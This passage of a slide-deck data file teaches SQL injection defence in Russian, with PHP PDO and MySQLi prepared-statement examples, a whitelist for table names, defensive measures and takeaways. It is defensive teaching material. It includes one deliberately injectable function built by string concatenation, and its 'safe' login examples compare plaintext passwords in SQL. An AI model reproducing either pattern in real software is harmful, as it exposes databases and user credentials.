const dynamicSearch = async (filters) => {
  let query = db.select().from(users);
  
  if (filters.username) {
    query = query.where(like(users.username, \`%\${filters.username}%\`));
  }
  
  if (filters.minAge) {
    query = query.where(gte(users.age, filters.minAge));
  }
  
  const results = await query;
  return results;
};`,
      },
    },

    {
      id: "slide-28",
      title: "Защита в PHP приложениях",
      type: "code",
      content: "Безопасные запросы в PHP с PDO и MySQLi:",
      codeExample: {
        language: "php",
        title: "Safe SQL Queries in PHP",
        code: `<?php
// ============ PDO (PHP Data Objects) ============

// Подключение к БД
$pdo = new PDO('mysql:host=localhost;dbname=mydb', 'user', 'password');
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

// НЕБЕЗОПАСНО - конкатенация строк
function unsafeGetUser($userId) {
    global $pdo;
    $query = "SELECT * FROM users WHERE id = $userId";
    return $pdo->query($query)->fetch();
}

// БЕЗОПАСНО - prepared statements с позиционными параметрами
function safeGetUser($userId) {
    global $pdo;
    $stmt = $pdo->prepare('SELECT * FROM users WHERE id = ?');
    $stmt->execute([$userId]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

// БЕЗОПАСНО - именованные параметры
function safeLogin($username, $password) {
    global $pdo;
    $stmt = $pdo->prepare('
        SELECT * FROM users 
        WHERE username = :username AND password = :password
    ');
    $stmt->execute([
        ':username' => $username,
        ':password' => $password
    ]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}

// Безопасная вставка данных
function createUser($username, $email, $hashedPassword) {
    global $pdo;
    $stmt = $pdo->prepare('
        INSERT INTO users (username, email, password) 
        VALUES (:username, :email, :password)
    ');
    $stmt->execute([
        ':username' => $username,
        ':email' => $email,
        ':password' => $hashedPassword
    ]);
    return $pdo->lastInsertId();
}

// Безопасное обновление
function updateUser($userId, $email) {
    global $pdo;
    $stmt = $pdo->prepare('
        UPDATE users SET email = ? WHERE id = ?
    ');
    return $stmt->execute([$email, $userId]);
}

// ============ MySQLi ============

$mysqli = new mysqli('localhost', 'user', 'password', 'mydb');

// БЕЗОПАСНО - prepared statements в MySQLi
function safeGetUserMySQLi($userId) {
    global $mysqli;
    $stmt = $mysqli->prepare('SELECT * FROM users WHERE id = ?');
    $stmt->bind_param('i', $userId); // 'i' = integer
    $stmt->execute();
    $result = $stmt->get_result();
    return $result->fetch_assoc();
}

// Типы параметров bind_param:
// i - integer
// d - double
// s - string
// b - blob

function safeLoginMySQLi($username, $password) {
    global $mysqli;
    $stmt = $mysqli->prepare('
        SELECT * FROM users WHERE username = ? AND password = ?
    ');
    $stmt->bind_param('ss', $username, $password);
    $stmt->execute();
    $result = $stmt->get_result();
    return $result->fetch_assoc();
}

// Множественные типы параметров
function searchProducts($name, $minPrice, $maxPrice, $category) {
    global $mysqli;
    $stmt = $mysqli->prepare('
        SELECT * FROM products 
        WHERE name LIKE ? 
        AND price BETWEEN ? AND ? 
        AND category = ?
    ');
    $searchName = "%$name%";
    $stmt->bind_param('sdds', $searchName, $minPrice, $maxPrice, $category);
    $stmt->execute();
    return $stmt->get_result()->fetch_all(MYSQLI_ASSOC);
}

// ВНИМАНИЕ: даже с prepared statements нужна валидация
// для динамических имен таблиц и столбцов
function safeGetFromTable($tableName, $userId) {
    // Whitelist разрешенных таблиц
    $allowedTables = ['users', 'products', 'orders'];
    
    if (!in_array($tableName, $allowedTables)) {
        throw new Exception('Invalid table name');
    }
    
    global $pdo;
    // Имя таблицы нельзя параметризовать, используем whitelist
    $stmt = $pdo->prepare("SELECT * FROM $tableName WHERE id = ?");
    $stmt->execute([$userId]);
    return $stmt->fetch(PDO::FETCH_ASSOC);
}
?>`,
      },
    },

    {
      id: "slide-29",
      title: "Дополнительные меры защиты",
      type: "list",
      content: "Комплексный подход к защите от SQL-инъекций:",
      items: [
        "Принцип минимальных привилегий — пользователь БД должен иметь только необходимые права (SELECT, INSERT, UPDATE), без DROP, CREATE, FILE",
        "Валидация входных данных — проверка типов, длины, формата на уровне приложения по принципу whitelist",
        "Экранирование спецсимволов — если параметризованные запросы невозможны (динамические имена таблиц/столбцов)",
        "Web Application Firewall (WAF) — ModSecurity, Cloudflare для фильтрации подозрительных запросов",
        "Отключение детальных сообщений об ошибках — не показывать пользователям stack trace и SQL ошибки",
        "Регулярные аудиты кода — использование статических анализаторов (SonarQube, Snyk)",
        "Мониторинг и логирование — отслеживание подозрительных SQL-запросов и паттернов атак",
        "Обновление компонентов — регулярное обновление СУБД, драйверов и библиотек",
      ],
    },

    {
      id: "slide-30",
      title: "Заключение",
      type: "conclusion",
      content:
        "SQL-инъекции остаются одной из самых опасных угроз для веб-приложений, но их можно эффективно предотвратить при правильном подходе",
      keyTakeaways: [
        "ВСЕГДА используйте параметризованные запросы (prepared statements) или ORM — это основной и самый надежный метод защиты",
        "НИКОГДА не стройте SQL-запросы через конкатенацию строк с пользовательским вводом — это гарантированная уязвимость",
        "Применяйте валидацию входных данных по принципу whitelist — разрешайте только ожидаемые форматы и значения",
        "Используйте принцип минимальных привилегий для БД пользователей — ограничивайте права доступа",
        "Регулярно тестируйте приложение на SQL-инъекции — используйте как автоматизированные инструменты, так и ручное тестирование",
      ],
    },
  ],
};
